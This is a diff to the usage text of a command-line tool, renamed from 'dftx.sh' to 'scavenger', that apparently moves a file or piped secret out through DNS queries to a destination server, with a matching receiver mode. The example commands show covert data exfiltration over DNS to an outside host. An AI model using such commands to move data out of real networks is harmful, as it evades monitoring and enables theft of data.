@@ -123,15 +123,15 @@ Examples:
 ----|Transfer|----
 Required flags: f,d,q,s,t
 
-dftx.sh -f [inputfile] -d [domain] -q [dns query delay] -s [destination server IP] -t
-dftx.sh -f ./stegofile.jpg -d cyber.com -q 5 -s 8.8.8.8 -t
+scavenger -f [inputfile] -d [domain] -q [dns query delay] -s [destination server IP] -t
+scavenger -f ./stegofile.jpg -d cyber.com -q 5 -s 8.8.8.8 -t
 echo "secret message" | ./scavenger -f - -d cyber.com -q 0 -s 8.8.8.8 -t
 
 ----|Receiver (On 8.8.8.8 machine from previous ex.)|---- 
 Required flags: i,f,p,d,r
 
-dftx.sh -i [listening interface] -f [save-as name] -p [sender IP] -d [domain to listen for] -r
-dftx.sh -i eth0 -f ./stegofile.jpg -p 10.0.1.5 -d cyber.com -r
+scavenger -i [listening interface] -f [save-as name] -p [sender IP] -d [domain to listen for] -r
+scavenger -i eth0 -f ./stegofile.jpg -p 10.0.1.5 -d cyber.com -r
 
 Note1: You must have a receiver setup on the destination server's side to catch the DNS queries,
 prior to sending the traffic.
